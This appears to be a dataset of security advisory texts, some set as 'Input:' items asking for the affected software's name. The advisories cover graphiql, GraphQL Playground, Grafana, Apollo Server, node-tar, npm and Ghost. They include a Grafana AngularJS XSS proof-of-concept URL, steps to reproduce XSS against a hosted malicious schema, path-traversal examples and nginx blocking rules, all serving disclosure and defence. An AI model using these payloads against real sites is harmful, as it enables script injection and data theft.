`graphiql@1.4.7`, we verified that our use of `markdown-it` prevents the inclusion of arbitrary HTML. We use `markdown-it` without setting `html: true`, so we are comfortable relying on [`markdown-it`'s HTML escaping](https://github.com/markdown-it/markdown-it/blob/master/docs/security.md) here. We considered running a second level of sanitization over all rendered Markdown using a library such as `dompurify` but believe that is unnecessary as `markdown-it`'s sanitization appears to be adequate. `graphiql@1.4.7` does update to the latest version of `markdown-it` (v12, from v10) so that any security fixes in v11 and v12 will take effect.\n\n### 3.1 CDN bundle implementations may be automatically patched\n\nNote that if your implementation is depending on a CDN version of `graphiql`, and is pointed to the `latest` tag (usually the default for most cdns if no version is specified) then this issue is already mitigated, in case you were vulnerable to it before.\n\n## 4. Workarounds for Older Versions\n\nIf you cannot use `graphiql@1.4.7` or later\n\n- Always use a static URL to a trusted server that is serving a trusted GraphQL schema.\n\n- If you have a custom implementation that allows using user-provided schema URLs via a query parameter, database value, etc, you must either disable this customization, or only allow trusted URLs.\n\n## 5. How to Re-create the Exploit\n\nYou can see an example on [codesandbox](https://codesandbox.io/s/graphiql-xss-exploit-gr22f?file=/src/App.js). These are both fixed to the last `graphiql` release `1.4.6` which is the last vulnerable release; however it would work with any previous release of `graphiql`.\n\nBoth of these examples are meant to demonstrate the phishing attack surface, so they are customized to accept a `url` parameter. To demonstrate the phishing attack, add `?url=https://graphql-xss-schema.netlify.app/graphql` to the in-codesandbox browser.\n\nErase the contents of the given query and type `{u`. You will see an alert window open, showing that attacker-controlled code was executed.\n\nNote that when React is in development mode, a validation exception is thrown visibly; however that exception is usually buried in the browser console in a production build of `graphiql`. This validation exception comes from `getDiagnostics`, which invokes `graphql` `validate()` which in turn will `assertValidSchema()`, as `apollo-server-core` does on executing each operation. This validation does not prevent the exploit from being successful.\n\nNote that something like the `url` parameter is not required for the attack to happen if `graphiql`'s `fetcher` is configured in a different way to communicate with a compromised GraphQL server.\n\n## 6.

[CVE-2021-41174](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41174) has been assigned to this vulnerability.\n\n### Impact\n\nIf an attacker is able to convince a victim to visit a URL referencing a vulnerable page, arbitrary JavaScript content may be executed within the context of the victim's browser.\n\nThe user visiting the malicious link must be unauthenticated and the link must be for a page that contains the login button in the menu bar.\n\nThere are two ways an unauthenticated user can open a page in Grafana that contains the login button:\n- Anonymous authentication is enabled. This means all pages in Grafana would be open for the attack.\n- The link is to an unauthenticated page. The following pages are vulnerable:\n  - `/dashboard-solo/snapshot/*`\n  - `/dashboard/snapshot/*`\n  - `/invite/:code`\n\nThe url has to be crafted to exploit AngularJS rendering and contain the interpolation binding for AngularJS expressions. AngularJS uses double curly braces for interpolation binding: {{ }} \n\nAn example of an expression would be: `{{constructor.constructor(\u2018alert(1)\u2019)()}}`. This can be included in the link URL like this: \n\nhttps://play.grafana.org/dashboard/snapshot/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D?orgId=1\n\nWhen the user follows the link and the page renders, the login button will contain the original link with a query parameter to force a redirect to the login page. The URL is not validated and the AngularJS rendering engine will execute the JavaScript expression contained in the URL.\n\n### Attack audit\n\nWe can not guarantee that the below will identify all attacks, so if you find something using the audit process described below, you should consider doing a full assessment.\n\n#### Through reverse proxy/load balancer logs\n\nTo determine if your Grafana installation has been exploited for this vulnerability, search through your reverse proxy/load balancer access logs for instances where the path contains `{{` followed by something that would invoke JavaScript code. For example, this could be code that attempts to show a fake login page or to steal browser or session data. The [OWASP cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) has several examples of XSS attacks.\n\n#### Through the Grafana Enterprise audit feature\n\nIf you enabled \u201cLog web requests\u201d in your configuration with `router_logging = true`, look for requests where `path` contains `{{` followed by something that would invoke JavaScript code.\n\n### Patched versions\n\nRelease 8.2.3:\n\n- [Download Grafana 8.2.3](https://grafana.com/grafana/download/8.2.3)\n- [Release notes](https://grafana.com/docs/grafana/latest/release-notes/release-notes-8-2-3/)\n\n### Solutions and mitigations\n\nDownload and install the appropriate patch for your version of Grafana.\n\n[Grafana Cloud](https://grafana.com/cloud) instances have already been patched, and [Grafana Enterprise](https://grafana.com/products/enterprise) customers were provided with updated binaries under embargo.\n\n### Workaround\n\nIf for some reason you cannot upgrade, you can use a reverse proxy or similar to block access to block the literal string `{{` in the path.\n\nExample of an Nginx rule to block the literal string `{{`:\n\n```\nlocation ~ \\{\\{ {\n    deny all;\n}\n```\n### Timeline and postmortem\n\nHere is a detailed timeline starting from when we originally learned of the issue.

Input: ### Impact\nIn certain configurations, Apollo Server serves the client-side web app \"GraphQL Playground\" from the same web server that executes GraphQL operations. This web app has access to cookies and other credentials associated with the web server's operations. There is a cross-site scripting vulnerability in GraphQL Playground that allows for arbitrary JavaScript code execution in your web server's origin. If a user clicks a specially crafted link to your GraphQL Playground page served by Apollo Server, an attacker can steal cookies and other private browser data.\n\nDetails of the underlying GraphQL Playground vulnerability are available in [this `graphql-playground` advisory](https://github.com/graphql/graphql-playground/security/advisories/GHSA-59r9-6jp6-jcm7). (A [similar vulnerability](https://github.com/graphql/graphiql/security/advisories/GHSA-x4r7-m2q9-69c8) exists in the related `graphiql` project.) This advisory focuses on identifying whether *Apollo Server* installations are vulnerable and mitigating the vulnerability in Apollo Server; see the other advisories for details on the XSS vulnerability itself.\n\nThe impact of this vulnerability is more severe if (as is common) your GraphQL server's origin URL is an origin that is used to store sensitive data such as cookies.\n\nIn order for this vulnerability to affect your Apollo Server installation, it must actually serve GraphQL Playground. The integration between Apollo Server and GraphQL Playground is different in Apollo Server 2 and Apollo Server 3. You can tell which version of Apollo Server you are running by looking at the version of the [package from which you import the `ApolloServer` class](https://www.apollographql.com/docs/apollo-server/integrations/middleware/): this may be `apollo-server`, `apollo-server-express`, `apollo-server-lambda`, etc.\n\n#### Apollo Server 3\n\nApollo Server 3 does not serve GraphQL Playground by default. It has a [landing page plugin system](https://www.apollographql.com/docs/apollo-server/api/plugin/landing-pages/) and the default plugin is a simple splash page that is not vulnerable to this exploit, linking to Apollo Sandbox Explorer. (We chose to change the default because GraphQL Playground is not actively maintained.)\n\nIf you are running Apollo Server 3, then you are *only* vulnerable if you *explicitly* import the [`ApolloServerPluginLandingPageGraphQLPlayground`](https://www.apollographql.com/docs/apollo-server/api/plugin/landing-pages/#graphql-playground-landing-page) plugin and pass it to your `ApolloServer`'s constructor in the `plugins` array. Otherwise, this advisory does not apply to your server.\n\n#### Apollo Server 2\n\nApollo Server 2 serves GraphQL Playground by default, unless the `NODE_ENV` environment variable is set to `production`, or if you explicitly configure it via the `playground` option to the `ApolloServer` constructor.\n\nYour Apollo Server 2 installation is vulnerable if *any* of the following is true:\n- You pass `playground: true` to the `ApolloServer` constructor\n- You pass some other object like `playground: {title: \"Title\"}` to the `ApolloServer` constructor\n- You do *not* pass any `playground` option to the `ApolloServer` constructor, *and* the `NODE_ENV` environment variable is *not* set to `production`\n\n#### Apollo Server 1\n\nApollo Server 1 included `graphiql` instead of `graphql-playground`. `graphiql` isn't automatically enabled in Apollo Server 1: you have to explicitly call a function such as `graphiqlExpress` to enable it. Because Apollo Server 1 is not commonly used, we have not done a detailed examination of whether the integration between Apollo Server 1 and `graphiql` is vulnerable to a similar exploit. If you are still using Apollo Server 1, we recommend you disable `graphiql` by removing the `graphiqlExpress` call, and then upgrade to a newer version of Apollo Server.\n\n### Patches and workarounds\n\nThere are several approaches you can take to ensure that your server is not vulnerable to this issue.\n\n#### Upgrade Apollo Server\n\nThe vulnerability has been patched in Apollo Server 2.25.3 and Apollo Server 3.4.1. To get the patch, upgrade your [Apollo Server entry point package](https://www.apollographql.com/docs/apollo-server/integrations/middleware/) to one of the fixed versions; this package may be `apollo-server`, `apollo-server-express`, `apollo-server-lambda`, etc. Additionally, if you depend directly on `apollo-server-core` in your `package.json`, make sure that you upgrade it to the same version.\n\n#### Upgrade Playground version only\n\nIf upgrading to the latest version of Apollo Server 2 or 3 quickly will be challenging, you can configure your current version of Apollo Server to serve the latest version of the GraphQL Playground app. This will pin your app to serve a specific version of GraphQL Playground and you will not receive updates to it when you upgrade Apollo Server later, but this may be acceptable because GraphQL Playground is not actively maintained.\n\nThe way to do this depends on what version of Apollo Server you're using and if you're already configuring GraphQL Playground.\n\n- **Apollo Server 3**: If you are using Apollo Server 3, then you are only vulnerable if your serve explicitly calls [`ApolloServerPluginLandingPageGraphQLPlayground`](https://www.apollographql.com/docs/apollo-server/api/plugin/landing-pages/#graphql-playground-landing-page) and passes it to the Apollo Server constructor in the `plugins` array. Add the option `version: '1.7.42'` to this call, so it looks like:\n```\nplugins: [ApolloServerPluginLandingPageGraphQLPlayground({version: '1.7.42'})]\n```\n- **Apollo Server 2 with no explicit `playground` option**: If you are using Apollo Server 2 and do not currently pass the `playground` option to `new ApolloServer`, add a `playground` option like so: \n```\nnew ApolloServer({ playground: process.env.NODE_ENV === 'production' ? false : { version: '1.7.42' } })\n```\n- **Apollo Server 2 with `playground: true` or `playground: {x, y, z}`**: If you are using Apollo Server 2 and currently pass `true` or an object to `new ApolloServer`, pass the `version` option under the `playground` option like so:\n```\nnew ApolloServer({ playground: { version: '1.7.42', x, y, z } })\n```\n\n#### Disable GraphQL Playground\n\nIf upgrading Apollo Server or GraphQL Playground is challenging, you can also disable GraphQL Playground.\n\nIn Apollo Server 3, remove the call to `ApolloServerPluginLandingPageGraphQLPlayground` from your `ApolloServer` constructor's `plugins` array. This will replace GraphQL Playground with a simple splash page. See [the landing page plugins docs](https://www.apollographql.com/docs/apollo-server/api/plugin/landing-pages/) for details.\n\nIn Apollo Server 2, add `playground: false` to your `ApolloServer` constructor: `new ApolloServer({ playground: false })`. This will replace GraphQL Playground with an attempt to execute a GraphQL operation, which will likely display an error in the browser.\n\nIf you disable GraphQL Playground, any users who rely on it to execute GraphQL operations will need an alternative, such as the [Apollo Studio Explorer's account-free Sandbox](https://www.apollographql.com/docs/studio/explorer/#account-free-sandbox).\n\n### Credit\n\nThis vulnerability was discovered by @Ry0taK.

Input: ## GraphQL Playground introspection schema template injection attack: Advisory Statement\n\nThis is a security advisory for an XSS vulnerability in `graphql-playground`.\n\nA similar vulnerability affects `graphiql`, the package from which `graphql-playground` was forked. There is a corresponding `graphiql` [advisory](https://github.com/graphql/graphiql/security/advisories/GHSA-x4r7-m2q9-69c8).\n\n- [1. Impact](#1-impact)\n- [2. Scope](#2-scope)\n- [3. Patches](#3-patches)\n- [4. Reproducing the exploit](#4-reproducing-the-exploit)\n- [5. Credit](#5-credit)\n- [6. For more information](#6-for-more-information)\n\n### 1. Impact\n\nAll versions of `graphql-playground-react` older than `graphql-playground-react@1.7.28` are vulnerable to compromised HTTP schema introspection responses or `schema` prop values with malicious GraphQL type names, exposing a dynamic XSS attack surface that can allow code injection on operation autocomplete.\n\nIn order for the attack to take place, the user must load a malicious schema in `graphql-playground`. There are several ways this can occur, including by specifying the URL to a malicious schema in the `endpoint` query parameter. If a user clicks on a link to a GraphQL Playground installation that specifies a malicious server, arbitrary JavaScript can run in the user's browser, which can be used to exfiltrate user credentials or other harmful goals.\n\n### 2. Scope\n\nThis advisory describes the impact on the `graphql-playground-react` package. The vulnerability also affects `graphiql`, the package from which `graphql-playground` was forked, with a less severe impact; see the [`graphiql` advisory](https://github.com/graphql/graphiql/security/advisories/GHSA-x4r7-m2q9-69c8) for details. It affects all versions of `graphql-playground-react` older than `v1.7.28`.\n\nThis vulnerability was introduced with the first public release of `graphql-playground`, so it impacts both the original legacy `graphql-playground` and the contemporary `graphql-playground-react` npm package. It is most easily exploited on `graphql-playground-react@1.7.0` and newer, as that release added functionality which made it possible to override the endpoint URL via query parameter even if it is explicitly specified in the code.\n\n`graphql-playground-react` is commonly loaded via the `graphql-playground-html` package or a middleware package that wraps it (`graphql-playground-express`, `graphql-playground-middleware-koa`, `graphql-playground-middleware-hapi`, or `graphql-playground-middleware-lambda`). By default, these packages render an HTML page which loads the *latest* version of `graphql-playground-react` through a CDN. If you are using one of these packages to install GraphQL Playground on your domain *and you do not explicitly pass the `version` option to `renderPlaygroundPage` or the middleware function*, then you do not need to take any action to resolve this vulnerability, as the latest version of the React app will automatically be loaded.\n\n`graphql-playground-react` is also commonly loaded via HTML served by Apollo Server. Apollo Server always pins a specific version of `graphql-playground-react`, so if you are using Apollo Server you do need to take action to resolve this vulnerability. See the [Apollo Server advisory](https://github.com/apollographql/apollo-server/security/advisories/GHSA-qm7x-rc44-rrqw) for details.\n\n\n### 3. Patches\n\n`graphql-playground-react@1.7.28` addresses this issue via defense in depth:\n\n- **HTML-escaping text** that should be treated as text rather than HTML. In most of the app, this happens automatically because React escapes all interpolated text by default. However, one vulnerable component uses the unsafe `innerHTML` API and interpolated type names directly into HTML. We now properly escape that type name, which fixes the known vulnerability.\n\n- **Validates the schema** upon receiving the introspection response or schema changes. Schemas with names that violate the GraphQL spec will no longer be loaded. (This includes preventing the Doc Explorer from loading.) This change is also sufficient to fix the known vulnerability.\n\n- **Ensuring that user-generated HTML is safe**. Schemas can contain Markdown in `description` and `deprecationReason` fields, and the web app renders them to HTML using the `markdown-it` library. Prior to `graphql-playground-react@1.7.28`, GraphQL Playground used two separate libraries to render Markdown: `markdown-it` and `marked`. As part of the development of `graphql-playground-react@1.7.28`, we verified that our use of `markdown-it` prevents the inclusion of arbitrary HTML. We use `markdown-it` without setting `html: true`, so we are comfortable relying on [`markdown-it`'s HTML escaping](https://github.com/markdown-it/markdown-it/blob/master/docs/security.md) here. We considered running a second level of sanitization over all rendered Markdown using a library such as `dompurify` but believe that is unnecessary as `markdown-it`'s sanitization appears to be adequate. `graphiql@1.4.3` does update to the latest version of `markdown-it` (v12, from v10) so that any security fixes in v11 and v12 will take effect. On the other hand, [`marked`](https://github.com/markedjs/marked) recommends the use of a separate HTML sanitizer if its input is untrusted. In this release, we switch the one component which uses `marked` to use `markdown-it` like the rest of the app.\n\n**If you are using `graphql-playground-react` directly in your client app**, upgrade to version 1.7.28 or later.\n\n**If you are using `graphql-playground-html` or a package which starts with `graphql-playground-middleware-` in your server** and you are passing the `version` option to a function imported from that package, change that `version` option to be at least `\"1.7.28\"`.\n\n**If you are using `graphql-playground-html` or a package which starts with `graphql-playground-middleware-` in your server** and you are **NOT** passing the `version` option to a function imported from that package, no action is necessary; your app automatically loads the latest version of `graphql-playground-react` from CDN.\n\n### 4. Reproducing the exploit\n\nWe are hosting a \"malicious\" server at https://graphql-xss-schema.netlify.app/graphql . This server has a hard-coded introspection result that includes unsafe HTML in type names.\n\nIf you manually change a GraphQL Playground installation to use that endpoint, clear the operation pane, and type `{x` into the operation pane, an alert will pop up; this demonstrates execution of code provided by the malicious server.\n\nAn URL like https://YOUR-PLAYGROUND-SERVER/?endpoint=https%3A%2F%2Fgraphql-xss-schema.netlify.app%2Fgraphql&query=%7B will load already configured with the endpoint in question. (This URL-based exploit works on `graphql-playground-react@1.7.0` and newer; older versions may be protected from this particular URL-based exploit depending on their configuration.)\n### 5.

Input: ### Impact\n\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\nnode-tar aims to guarantee that any file whose location would be outside of the extraction target directory is not extracted. This is, in part, accomplished by sanitizing absolute paths of entries within the archive, skipping archive entries that contain `..` path portions, and resolving the sanitized paths against the extraction target directory.\n\nThis logic was insufficient on Windows systems when extracting tar files that contained a path that was not an absolute path, but specified a drive letter different from the extraction target, such as `C:some\\path`.  If the drive letter does not match the extraction target, for example `D:\\extraction\\dir`, then the result of `path.resolve(extractionDirectory, entryPath)` would resolve against the current working directory on the `C:` drive, rather than the extraction target directory.\n\nAdditionally, a `..` portion of the path could occur immediately after the drive letter, such as `C:../foo`, and was not properly sanitized by the logic that checked for `..` within the normalized and split portions of the path.\n\nThis only affects users of `node-tar` on Windows systems.\n\n### Patches\n\n4.4.18 || 5.0.10 || 6.1.9\n\n### Workarounds\n\nThere is no reasonable way to work around this issue without performing the same path normalization procedures that node-tar now does.\n\nUsers are encouraged to upgrade to the latest patched versions of node-tar, rather than attempt to sanitize paths themselves.\n\n### Fix\n\nThe fixed versions strip path roots from all paths prior to being resolved against the extraction target folder, even if such paths are not \"absolute\".\n\nAdditionally, a path starting with a drive letter and then two dots, like `c:../`, would bypass the check for `..` path portions.  This is checked properly in the patched versions.\n\nFinally, a defense in depth check is added, such that if the `entry.absolute` is outside of the extraction taret, and we are not in preservePaths:true mode, a warning is raised on that entry, and it is skipped.  Currently, it is believed that this check is redundant, but it did catch some oversights in development.\n. Top 1 search result is npm:tar.

Input: ### Impact\n\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\n`@npmcli/arborist`, the library that calculates dependency trees and manages the `node_modules` folder hierarchy for the npm command line interface, aims to guarantee that package dependency contracts will be met, and the extraction of package contents will always be performed into the expected folder.\n\nThis is, in part, accomplished by resolving dependency specifiers defined in `package.json` manifests for dependencies with a specific name, and nesting folders to resolve conflicting dependencies.\n\nWhen multiple dependencies differ only in the case of their name, Arborist's internal data structure saw them as separate items that could coexist within the same level in the `node_modules` hierarchy.  However, on case-insensitive file systems (such as macOS and Windows), this is not the case.  Combined with a symlink dependency such as `file:/some/path`, this allowed an attacker to create a situation in which arbitrary contents could be written to any location on the filesystem.\n\nFor example, a package `pwn-a` could define a dependency in their `package.json` file such as `\"foo\": \"file:/some/path\"`.  Another package, `pwn-b` could define a dependency such as `FOO: \"file:foo.tgz\"`.  On case-insensitive file systems, if `pwn-a` was installed, and then `pwn-b` was installed afterwards, the contents of `foo.tgz` would be written to `/some/path`, and any existing contents of `/some/path` would be removed.\n\nAnyone using npm v7.20.6 or earlier on a case-insensitive filesystem is potentially affected.\n\n### Patches\n\n2.8.2 (included in npm v7.20.7 and above)\n\n### Fix and Caveats\n\nThere are two parts to the fix:\n\n1. Immediately prior to extraction, if the target folder is not a directory, it is moved aside.  (If the installation fails, filesystem entries moved aside in this manner are moved back as part of the rollback process.)\n2. The `children` map that represents child nodes in the tree is replaced with a case-insensitive map object, such that `node.children.get('foo')` and `node.children.get('FOO')` will return the same object, enabling Arborist to detect and handle this class of tree collision.\n\nThis second item imposes a caveat on case _sensitive_ filesystems where two packages with names which differ only in case may already exist at the same level in the tree, causing unpredictable behavior in this rare edge case.  Note that in such cases, the `package-lock.json` already creates a situation which is hazardous to use on case-sensitive filesystems, and will likely lead to other problems.\n\nIf affected by this caveat, please run `npm update` to rebuild your tree and generate a new `package-lock.json` file..

Input: ### Impact\n\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\n`node-tar` aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks. Additionally, in order to prevent unnecessary stat calls to determine whether a given path is a directory, paths are cached when directories are created.\n\nThis logic was insufficient when extracting tar files that contained both a directory and a symlink with the same name as the directory, where the symlink and directory names in the archive entry used backslashes as a path separator on posix systems. The cache checking logic used both `\\` and `/` characters as path separators, however `\\` is a valid filename character on posix systems.\n\nBy first creating a directory, and then replacing that directory with a symlink, it was thus possible to bypass node-tar symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite.\n\nAdditionally, a similar confusion could arise on case-insensitive filesystems.  If a tar archive contained a directory at `FOO`, followed by a symbolic link named `foo`, then on case-insensitive file systems, the creation of the symbolic link would remove the directory from the filesystem, but _not_ from the internal directory cache, as it would not be treated as a cache hit.  A subsequent file entry within the `FOO` directory would then be placed in the target of the symbolic link, thinking that the directory had already been created. \n\nThese issues were addressed in releases 4.4.16, 5.0.8 and 6.1.7.\n\nThe v3 branch of `node-tar` has been deprecated and did not receive patches for these issues. If you are still using a v3 release we recommend you update to a more recent version of `node-tar`. If this is not possible, a workaround is available below.\n\n### Patches\n\n4.4.16 || 5.0.8 || 6.1.7\n\n### Workarounds\n\nUsers may work around this vulnerability without upgrading by creating a custom filter method which prevents the extraction of symbolic links.\n\n```js\nconst tar = require('tar')\n\ntar.x({\n  file: 'archive.tgz',\n  filter: (file, entry) => {\n    if (entry.type === 'SymbolicLink') {\n      return false\n    } else {\n      return true\n    }\n  }\n})\n```\n\nUsers are encouraged to upgrade to the latest patched versions, rather than attempt to sanitize tar input themselves.\n\n### Fix\n\nThe problem is addressed in the following ways:\n\n1. All paths are normalized to use `/` as a path separator, replacing `\\` with `/` on Windows systems, and leaving `\\` intact in the path on posix systems.  This is performed in depth, at every level of the program where paths are consumed.\n2. Directory cache pruning is performed case-insensitively.  This _may_ result in undue cache misses on case-sensitive file systems, but the performance impact is negligible.\n\n#### Caveat\n\nNote that this means that the `entry` objects exposed in various parts of tar's API will now always use `/` as a path separator, even on Windows systems.  This is not expected to cause problems, as `/` is a valid path separator on Windows systems, but _may_ result in issues if `entry.path` is compared against a path string coming from some other API such as `fs.realpath()` or `path.resolve()`.\n\nUsers are encouraged to always normalize paths using a well-tested method such as `path.resolve()` before comparing paths to one another..

Input: ### Impact\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\nnode-tar aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks. Additionally, in order to prevent unnecessary stat calls to determine whether a given path is a directory, paths are cached when directories are created.\n\nThis logic was insufficient when extracting tar files that contained two directories and a symlink with names containing unicode values that normalized to the same value. Additionally, on Windows systems, long path portions would resolve to the same file system entities as their 8.3 \"short path\" counterparts. A specially crafted tar archive could thus include directories with two forms of the path that resolve to the same file system entity, followed by a symbolic link with a name in the first form, lastly followed by a file using the second form. It led to bypassing node-tar symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite.\n\nThe v3 branch of `node-tar` has been deprecated and did not receive patches for these issues. If you are still using a v3 release we recommend you update to a more recent version of `node-tar`. If this is not possible, a workaround is available below.\n\n### Patches\n\n6.1.9 || 5.0.10 || 4.4.18\n\n### Workarounds\n\nUsers may work around this vulnerability without upgrading by creating a custom filter method which prevents the extraction of symbolic links.\n\n```js\nconst tar = require('tar')\n\ntar.x({\n  file: 'archive.tgz',\n  filter: (file, entry) => {\n    if (entry.type === 'SymbolicLink') {\n      return false\n    } else {\n      return true\n    }\n  }\n})\n```\n\nUsers are encouraged to upgrade to the latest patched versions, rather than attempt to sanitize tar input themselves.\n\n#### Fix\n\nThe problem is addressed in the following ways, when comparing paths in the directory cache and path reservation systems:\n\n1. The `String.normalize('NFKD')` method is used to first normalize all unicode to its maximally compatible and multi-code-point form.\n2. All slashes are normalized to `/` on Windows systems (on posix systems, `\\` is a valid filename character, and thus left intact).\n3. When a symbolic link is encountered on Windows systems, the entire directory cache is cleared.  Collisions related to use of 8.3 short names to replace directories with other (non-symlink) types of entries may make archives fail to extract properly, but will not result in arbitrary file writes.\n.

Please identify the software name affected by it. Input: TCR is temporarily miscalculated in the `batchLiquidateTroves` function during Recovery Mode.\n\nThe bug lies in [`batchLiquidateTroves` of `TroveManager`](https://github.com/liquity/dev/blob/7c83ea11378454629618b3808b16fbfda69ee3e5/packages/contracts/contracts/TroveManager.sol#L722). \n\nWhen calculating system's entire collateral, we should also exclude the liquidated trove's surplus collateral, since liquidation closes the trove and makes the surplus collateral claimable by the trove owner. This means, this line of code should look like this: \n```\nvars.entireSystemColl = vars.entireSystemColl.sub(singleLiquidation.collToSendToSP).sub(singleLiquidation.collSurplus);\n```\n### Impact\n\nThe miscalculated entire collateral is used only to calculate the TCR and check if the system has been able to exit Recovery Mode. The miscalulation only persists temporarily, and within the`batchLiquidateTroves` transaction. Once the transaction completes the TCR and Recovery Mode will be calculated properly again. However, the bug could negatively impact the liquidation throughput and the gas efficiency gains from batching multiple liquidations in a single transaction.\n\nIn normal situations, the impact of the collateral surplus of a Trove on the global TCR would be tiny. For instance, we have calculated that liquidating a trove with a collateral representing 1% of the total system collateral (so in the order of at least $10M at current values), would lead to an extra 0.53% in the temporary miscalculation of TCR. So for this bug to be meaningful, in such a scenario, the resulting real TCR must be already be very close to the Recovery Mode boundary anyway - i.e. between 149.47% and 150%. The batch liquidation transaction should also be executed with a particular trove ordering to achieve the TCR distortion. When a different trove order for the liquidation transaction is selected, the bug has no impact. In summary, the bug only has a non-negligible impact in a very narrow, specific set of circumstances.\n\nThe potential effects of the bug after it occurs are:\n\n- The next trove in the sequence is not liquidated because the `batchLiquidateTroves` function calculates a premature exit from Recovery Mode. It could be liquidated in a subsequent transaction if the price of Ether doesn\u2019t recover.\n- The next trove in the sequence has an ICR below 100% and it\u2019s offset against the Stability Pool instead of redistributed among other troves because the function calculates a premature exit from Recovery Mode. For this to happen, the Ether price must have instantly plummeted by more than 10% (otherwise, the trove would have been already liquidated before).\n- The next trove in the sequence is liquidated while its ICR is over the real TCR: the function calculates the TCR as being slightly too high, and thus can liquidate a trove that has ICR less than the calculated TCR, but greater than the true TCR. This is probably the worst outcome - however it is already possible to achieve the same effect, regardless of the bug.  A liquidator can craft a `batchLiquidateTroves` transaction whereby they select troves for liquidation such that the TCR increases and makes a given trove liquidateable. To liquidate trove A, they can order troves such that they first liquidate troves which raise the TCR to between A's ICR and 150%. This is intended and expected behavior. As clearly stated in Liquity documentation, to be completely safe and guarantee immunity from liquidation in Recovery Mode, borrowers should keep their ICR above 150%.\n\nWe don't believe this bug creates a profitable exploit. Theoretically, and only in a very narrow set of circumstances, a liquidator could try to send a batch liquidation during Recovery Mode that lets the system very temporarily return to Normal Mode earlier than it should. In that case - _and only if the Ether price also happens to suddenly plummet by more than 10%_ - stability providers might take the haircut that should be taken by the borrowers (through redistribution).\n\n### Patches\nThe problem has been patched in the source code but not on mainnet contracts.

Input: ### Impact\n\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\n`node-tar` aims to prevent extraction of absolute file paths by turning absolute paths into relative paths when the `preservePaths` flag is not set to `true`. This is achieved by stripping the absolute path root from any absolute file paths contained in a tar file. For example `/home/user/.bashrc` would turn into `home/user/.bashrc`. \n\nThis logic was insufficient when file paths contained repeated path roots such as `////home/user/.bashrc`. `node-tar` would only strip a single path root from such paths. When given an absolute file path with repeating path roots, the resulting path (e.g. `///home/user/.bashrc`) would still resolve to an absolute path, thus allowing arbitrary file creation and overwrite. \n\n### Patches\n\n3.2.2 || 4.4.14 || 5.0.6 || 6.1.1\n\nNOTE: an adjacent issue [CVE-2021-32803](https://github.com/npm/node-tar/security/advisories/GHSA-r628-mhmh-qjhw) affects this release level.

Please identify the software name affected by it. Input: ### Impact\n\nThis advisory addresses several LOW severity issues with streaming signed messages and restricting processing of certain types of invalid messages. \n\nThis ESDK supports a streaming mode where callers may stream the plaintext of signed messages before the ECDSA signature is validated. In addition to these signatures, the ESDK uses AES-GCM encryption and all plaintext is verified before being released to a caller. There is no impact on the integrity of the ciphertext or decrypted plaintext, however some callers may rely on the the ECDSA signature for non-repudiation. Without validating the ECDSA signature, an actor with trusted KMS permissions to decrypt a message may also be able to encrypt messages. This update introduces a new API for callers who wish to stream only unsigned messages. \n\nFor customers who process ESDK messages from untrusted sources, this update also introduces a new configuration to limit the number of Encrypted Data Keys (EDKs) that the ESDK will attempt to process per message. This configuration provides customers with a way to limit the number of AWS KMS Decrypt API calls that the ESDK will make per message. This setting will reject messages with more EDKs than the configured limit.\n\nFinally, this update adds early rejection of invalid messages with certain invalid combinations of algorithm suite and header data.\n\n### Patches\n\nFixed in versions 1.9 and 2.2. We recommend that all users upgrade to address these issues.\n\nCustomers leveraging the ESDK\u2019s streaming features have several options to protect signature validation. One is to ensure that client code reads to the end of the stream before using released plaintext. With this release, using the new API for streaming and falling back to the non-streaming decrypt API for signed messages prevents using any plaintext from signed data before the signature is validated. See https://docs.aws.amazon.com/encryption-sdk/latest/developer-guide/about-versions.html#version2.2.x\n\nUsers processing ESDK messages from untrusted sources should use the new maximum encrypted data keys parameter. See https://docs.aws.amazon.com/encryption-sdk/latest/developer-guide/about-versions.html#version2.2.x\n\n### Workarounds\n\nNone\n\n### For more information\n\nhttps://docs.aws.amazon.com/encryption-sdk/latest/developer-guide/concepts.html#digital-sigs\n\nhttps://docs.aws.amazon.com/encryption-sdk/latest/developer-guide/about-versions.html#version2.2.x\n.

Since the vulnerability lies within the verification method, the previous signatures are still valid. We highly recommend reverifying any signatures that were previously verified with the vulnerable `verifyWithMessage` method.\n\n### Workarounds\nIn `tenvoy.js` under the `verifyWithMessage` method definition within the `tEnvoyNaClSigningKey` class, ensure that the return statement call to `this.verify` ends in `.verified`.

Input: ### Impact\nAn unused endpoint added during the development of 4.0.0 has left sites vulnerable to untrusted users gaining access to Ghost Admin. Attackers can gain access by getting logged in users to click a link containing malicious code. Users do not need to enter credentials and may not know they've visited a malicious site. \n\nGhost(Pro) has already been patched. We can find no evidence that the issue was exploited on Ghost(Pro) prior to the patch being added. \n\nSelf-hosters are impacted if running Ghost a version between 4.0.0 and 4.3.2. Immediate action should be taken to secure your site - see patches & workarounds below.\n\n### Patches\nFixed in 4.3.3, all 4.x sites should upgrade as soon as possible.\nAs the endpoint is unused, the patch simply removes it. \n\n### Workarounds\n- Log out of Ghost Admin\n- Suspend any users who cannot log out\n- Block access to `/ghost/preview`\n\nExample of how to block access in nginx:\n\n```\nlocation ~ /ghost/preview {\n    rewrite ^(\\/(.*\\/)?ghost\\/)(.*)$ $1 redirect;\n}\n```\n\nThis redirects the endpoint to `/ghost/`, which mimics the behaviour after the patch is applied.\n\n### References\n\n- [Forum Post](https://forum.ghost.org/t/critical-security-update-available-for-ghost-4-x/22290)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* email us at security@ghost.org\n\n\n---\nCredits: Paul Gerste, SonarSource (https://www.sonarsource.com/).

